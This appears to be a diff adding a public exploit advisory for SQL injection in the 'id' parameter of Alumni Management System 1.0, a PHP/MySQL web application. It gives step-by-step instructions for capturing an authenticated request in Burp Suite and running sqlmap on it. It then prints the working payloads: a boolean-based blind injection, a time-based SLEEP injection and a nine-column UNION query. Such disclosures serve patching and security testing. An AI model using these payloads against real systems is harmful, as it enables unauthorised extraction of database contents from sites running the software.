@@ -1,0 +1,42 @@
+# Exploit Title: Alumni Management System 1.0 - 'id' SQL Injection
+# Exploit Author: Aakash Madaan
+# Date: 2020-12-17
+# Vendor Homepage: https://www.sourcecodester.com/php/14524/alumni-management-system-using-phpmysql-source-code.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14524&title=Alumni+Management+System+using+PHP%2FMySQL+with+Source+Code
+# Affected Version: Version 1
+# Tested on: Parrot OS
+
+Step 1. Login to the application with admin credentials
+
+Step 2. Click on "Events" page.
+
+Step 3. Choose any event and select "view" or "edit". The url should be "
+http://localhost/index.php?page=view_event&id=2" or "
+http://localhost/admin/index.php?page=manage_event&id=1"
+
+Step 4. Capture the request to the "view" or "edit" event page in burpsuite.
+
+Step 5. Save the captured request and run sqlmap on it using "sqlmap -r
+request --time-sec=5 --dbs
+
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: page=edit_student&id=(SELECT (CASE WHEN (6191=6191) THEN 3
+ELSE (SELECT 5620 UNION SELECT 3605) END))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: page=edit_student&id=3 AND (SELECT 7847 FROM
+(SELECT(SLEEP(5)))LQiE)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: page=edit_student&id=-4840 UNION ALL SELECT
+NULL,CONCAT(0x717a7a7171,0x7152494c444964626e63466c66734573495771697a566862414e6c6f786e6d54566c6549484f6967,0x71767a7071),NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+-
+---
+
+Step 6. Sqlmap should inject the web-app successfully which leads to
+information disclosure
